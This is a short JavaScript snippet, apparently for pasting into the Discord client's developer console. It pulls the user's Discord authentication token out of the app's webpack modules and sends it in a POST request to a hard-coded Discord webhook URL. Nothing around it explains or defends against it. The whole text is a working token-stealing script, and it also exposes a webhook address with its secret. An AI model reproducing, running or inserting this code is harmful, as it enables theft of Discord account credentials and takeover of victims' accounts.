const webhook = 'https://discord.com/api/webhooks/1408157196591825018/OXuCSkShIMn7GoJHszwVLS9i5ILtz-I1EfQrDsMQYrVjisDvgA0aneLbYiXjtOQ6EX1_';

var token = (webpackChunkdiscord_app.push([[''], {}, e => {
  m = [];
  for (let c in e.c) m.push(e.c[c]);
}]), m).find(x => x?.exports?.default?.getToken !== undefined).exports.default.getToken();

console.log("Token:", token);

if (token) {
  fetch(webhook, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      content: `Token: ${token}`
    })
  })
  .then(response => response.json())
  .then(data => console.log('Success:', data))
  .catch((error) => console.error('Error:', error));
} else {
  console.log("Token not found or undefined.");
}
